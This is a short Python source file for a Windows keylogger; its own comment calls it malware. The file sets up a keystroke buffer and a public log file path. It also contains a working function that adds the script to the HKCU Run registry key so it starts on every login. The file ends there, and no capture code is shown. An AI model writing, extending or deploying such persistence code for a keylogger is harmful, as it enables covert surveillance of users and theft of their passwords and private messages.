import winreg
import sys
import os
import time


#Buffer to hold the keystrokes before logging
text = ""

# Track the last time the buffer was logged
lastLogTime = time.time()

#log text path
logPath= r"C:\Users\Public\Keylogs.txt"

# function to add the malware to the windows registry
def add_to_startup():
    """Add current script to Windows startup via registry"""
    try:
        # Get the path to the current script
        script_path = os.path.abspath(sys.argv[0])
        
        # Create the command to run (python + script path)
        python_path = sys.executable
        startup_command = f'"{python_path}" "{script_path}"'
        
        # Open registry key for startup programs
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        
        # Add entry 
        winreg.SetValueEx(
            key,
            "keylogger",  # Name that appears in startup
            0,
            winreg.REG_SZ,
            startup_command
        )
        
        winreg.CloseKey(key)
        print("Successfully added to startup!")
        return True
        
    except Exception as e:
        print(f"Failed to add to startup: {e}")
        return False
